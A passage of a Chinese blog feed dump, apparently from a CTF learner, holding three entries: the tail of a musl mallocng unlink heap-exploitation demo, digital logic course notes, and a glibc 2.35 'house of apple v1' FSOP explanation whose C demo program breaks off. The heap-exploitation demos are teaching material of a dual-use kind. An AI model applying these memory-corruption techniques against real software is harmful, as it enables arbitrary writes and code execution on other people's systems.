g-&gt;last_idx+1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (g-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstep_seq();\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\trecord_seq(sc);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.base = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.len = g-&gt;maplen*4096UL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tvoid *p = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstruct meta *m = get_meta(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tint idx = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tg-&gt;mem-&gt;meta = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// not checking size/reserved here; it&#x27;s intentionally invalid\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi = nontrivial_free(m, idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfree_meta(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn mi;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这需要我们设置meta-&gt;maplen为非零值，防止再次进入nontrivial_free。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这里的maplen就设置为group占用的页数量即可。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们向meta的两个链表指针写入事先准备好的地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;prev写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_1);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;next写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_2);</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = (<span class="keyword">struct</span> meta*)victim_1;</span><br><span class="line">    fake_meta-&gt;next = (<span class="keyword">struct</span> meta*)victim_2;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面调用free函数释放这个假chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;释放后，目标地址附近的值已经被成功修改：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim_1, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这证明使用一个假chunk修改两个地址的值是可行的，在free之后，chunk所在的页被释放了，这样就不会对接下来的进一步利用造成其他任何影响了。</p><p>为了利用unlink，我们需要构造很多东西，不能落下其中任何一个，在解题与学习时要特别注意。在下一篇文章中笔者将会分析unlink如何与FILE结构体配合，从而最终getshell。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 Chapter 1——基本知识</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-1%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-1%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h1><p>数字信号：在时间和数值上离散变化的信号。<br>数字逻辑电路：用于处理数字信号的电路，通过逻辑运算、判断来实现。<br>特点：</p><ul><li>是二值信号</li><li>半导体期间处于开或关状态</li><li>结构简单、功耗低、便于集成</li><li>速度快、精度高、功能强、可靠性好</li></ul><p>分类：</p><ul><li>根据是否具有记忆功能分为数字逻辑电路和组合逻辑电路</li><li>时序逻辑电路：逻辑电路在任何时刻的稳定输出不仅取决于该时刻的输入，还与过去的输入有关</li><li>同步与异步</li></ul><p>研究方法：逻辑分析与逻辑设计</p><h1 id="1-2-数制与转换"><a href="#1-2-数制与转换" class="headerlink" title="1.2 数制与转换"></a>1.2 数制与转换</h1><p>小数转换：乘n取整法</p><h1 id="1-3-带符号二进制数的代码表示"><a href="#1-3-带符号二进制数的代码表示" class="headerlink" title="1.3 带符号二进制数的代码表示"></a>1.3 带符号二进制数的代码表示</h1><p>原码：符号位0为正，1为负，其他不变<br>反码：符号位0为正，1为负，负数的其他位均取反<br>补码：正数与原码相同，负数为反码加1</p><h1 id="1-4-几种常用编码"><a href="#1-4-几种常用编码" class="headerlink" title="1.4 几种常用编码"></a>1.4 几种常用编码</h1><h2 id="1-4-1"><a href="#1-4-1" class="headerlink" title="1.4.1"></a>1.4.1</h2><p>8421码<br>2421码<br>余3码</p><h2 id="1-4-2-可靠性编码"><a href="#1-4-2-可靠性编码" class="headerlink" title="1.4.2 可靠性编码"></a>1.4.2 可靠性编码</h2><ol><li>格雷码：任意两个相邻的数，其格雷码仅有1位不同。<br>二进制转格雷码方法：最高位不变，格雷码第i位为原二进制码第i位和第i+1位异或得到。<br>格雷码转二进制码方法：从高位向低位依次转换，二进制最高位即为格雷码最高位，往下第i位为格雷码第i位与第i+1位异或得到。</li><li>奇偶校验码：检验信息位中 <strong>“1”</strong> 的个数，对于奇校验，如果1的个数为奇数则校验位为<strong>0</strong>，偶校验则是1的个数为偶数时校验位为<strong>0</strong>。（别搞反了！）</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc 2.35 pwn——house of apple v1 示例程序</title>
      <link href="/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v1-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v1-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>house of apple这种利用方式针对于新版的glibc，在<a href="https://bbs.kanxue.com/thread-273418.htm">这个资料</a>中有详细的分析与说明。这里根据该资料进行简单总结，并编写示例程序便于理解。</p><p>在house of pig中，我们需要使用两次large bin attack攻击作为前菜，第一次需要修改<code>_IO_list_all</code>指针的值，第二次需要修改<code>__free_hook</code>附近空间的值。而与之形成对比的是，house of apple只需要1次large bin attack即可完成攻击。这里需要注意：<font color=red><strong>house of apple并不是一个可以直接getshell的攻击方式，它更像是一种攻击思路，一种只使用一次large bin attack进行FSOP的思路，在house of apple之后可以接上多种多样的攻击方式来达到我们最终的目的。考虑到与<code>FILE</code>结构体有关的函数有很多都是可以利用的，因此在具体的情境下，攻击的流程一般较为灵活。</strong></font></p><blockquote><p>使用house of apple的条件为：<br>1、程序从main函数返回或能调用exit函数<br>2、能泄露出heap地址和libc地址<br>3、 能使用一次largebin attack（一次即可）</p></blockquote><p>house of apple v1通过exit函数触发，exit调用到<code>_IO_flush_all_lockp</code>，后者遍历<code>_IO_list_all</code>中的<code>FILE</code>结构体并依次执行跳表中的overflow函数。在本利用方式中，使用伪造的<code>FILE</code>结构体，<code>vtable</code>填写<code>_IO_wstrn_jumps</code>，这样可以执行到<code>_IO_wstrn_overflow</code>函数，而<code>_IO_wstrn_overflow</code>会进行一系列赋值操作，将假<code>FILE</code>结构体的<code>_wide_data</code>字段保存的地址附近写入多个值。</p><p>具体的利用方式详见下面的示例程序，在开头提到的资料中还有针对house of apple攻击后的一系列可能的后续操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 23-1-10.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> victim[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_victim</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;修改后：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim, <span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示house of apple v1利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;测试于ubuntu 22.04，glibc版本：Ubuntu GLIBC 2.35-0ubuntu3.1。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;house of apple并不是一个能直接getshell的攻击方式，它的功能是在任意地址写堆地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在很多赛题中，house of apple只是一个引子，&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;在第一个FILE后面接其他的FILE结构体可以实现多种方式的利用。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本演示程序就是利用第二个伪造的FILE结构体打印house of apple的攻击效果。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在house of apple v1中，利用的核心思想是FILE结构体中的_wide_data字段。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;再一次重温FILE结构体的内容：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libioP.h, line 334)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE_complete_plus\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE_complete file;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libioP.h, line 324)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE_plus\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE file;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/bits/types/struct_FILE.h, line 85)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE_complete\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE _file;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __off64_t _offset;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Wide character stream stuff.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt *_codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_wide_data *_wide_data;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE *_freeres_list;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  void *_freeres_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  size_t __pad5;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _mode;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Make sure we don&#x27;t get into trouble again.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/bits/types/struct_FILE.h, line 49)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE\n&quot;</span></span><br><span class="line">                 <span 